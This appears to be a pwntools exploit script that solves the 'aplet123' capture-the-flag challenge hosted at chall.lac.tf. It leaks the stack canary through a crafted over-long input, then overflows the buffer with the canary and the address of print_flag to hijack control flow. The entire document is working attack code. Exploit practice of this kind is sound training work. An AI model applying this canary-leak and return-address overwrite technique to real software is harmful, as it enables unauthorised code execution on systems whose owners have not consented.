#!/usr/bin/python3

from pwn import *

exe = ELF("aplet123", checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""

                b* 0x0000000000401365   
                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("chall.lac.tf", 31123)
else:
    p = process(exe.path)

GDB()
sla(b"hello\n", b"a" * 69 + b"i'm")
p.recvuntil(b"hi ")

canary = u64(b"\0" + p.recv(7))
info("canary: " + hex(canary))
sl(b"a" * 69 + b"i'm" + p64(canary) +p64(0) +  p64(exe.sym.print_flag + 1))
sl(b"bye")
p.interactive()
